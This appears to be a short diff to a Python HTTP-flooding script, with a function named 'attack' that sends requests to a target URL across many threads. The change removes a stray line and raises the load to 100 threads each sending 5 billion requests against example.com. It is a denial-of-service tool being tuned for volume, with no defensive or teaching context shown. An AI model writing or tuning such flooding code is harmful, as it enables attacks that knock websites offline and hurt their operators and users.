@@ -1,4 +1,3 @@
-python
 import requests
 import threading
 import time
@@ -28,8 +27,8 @@ def attack(target_url, requests_per_thread):
 
 def main():
     target_url = "https://example.com"
-    thread_count = 1000  # Adjust as needed
-    requests_per_thread = 1000000  # 1 million per thread
+    thread_count = 100  # Adjust as needed
+    requests_per_thread = 5000000000  # 5 billion per thread
     
     # Create and start threads
     threads = []
